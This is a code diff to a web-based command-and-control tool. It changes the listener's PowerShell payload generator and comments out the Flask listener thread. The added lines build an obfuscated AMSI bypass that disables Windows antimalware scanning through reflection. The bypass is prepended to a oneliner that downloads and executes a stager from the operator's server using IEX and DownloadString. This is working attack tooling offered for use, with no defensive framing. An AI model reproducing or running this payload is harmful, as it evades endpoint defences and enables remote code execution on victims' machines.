@@ -112,11 +112,15 @@ class Listener():
             if listener:
                 listener.ip = ip
                 listener.save()
-            oneliner = "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')\"".format(ip, str(port), eth)
+            amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
+            oneliner = "{} IEX(New-Object Net.WebClient).DownloadString(\'http://{}:{}/sc/{}\')".format(amsi,ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
+
+#powershell.exe -nop -w hidden -c 
 
         def get(self,request):
             return render(request,'blog/payload-Gen.html')
+
 
 
     class lin_payloadGen(View):
@@ -164,24 +168,24 @@ class Listener():
             if os.path.exists(self.Path) == False:
                 os.mkdir(self.Path)
                 
-        def run(eth_ip,port):      ######multi threading with django or flask
-            app.logger.disabled = True
-            app.run(port=port, host=eth_ip)
+        # def run(eth_ip,port):      ######multi threading with django or flask
+        #     app.logger.disabled = True
+        #     app.run(port=port, host=eth_ip)
             
-        def start(self):
-            server = Process(target=Listener.agent.run(self.eth_ip,port))  
-            cli = sys.modules['flask.cli']
-            cli.show_server_banner = lambda *x: None
-            daemon = threading.Thread(name = self.name,
-                                            target = server.start,
-                                            args= ())
-            daemon.daemon = True
-            daemon.start()
-            try:
-                Listener.agent.start(self)
-                print("Listener started.")
-            except:
-                print("Failed. Check your options.")
+        # def start(self):
+        #     server = Process(target=Listener.agent.run(self.eth_ip,port))  
+        #     cli = sys.modules['flask.cli']
+        #     cli.show_server_banner = lambda *x: None
+        #     daemon = threading.Thread(name = self.name,
+        #                                     target = server.start,
+        #                                     args= ())
+        #     daemon.daemon = True
+        #     daemon.start()
+        #     try:
+        #         Listener.agent.start(self)
+        #         print("Listener started.")
+        #     except:
+        #         print("Failed. Check your options.")
                 
 # Create Download link to redirect to sendFile funtion
         def sendScript(request , eth=''):
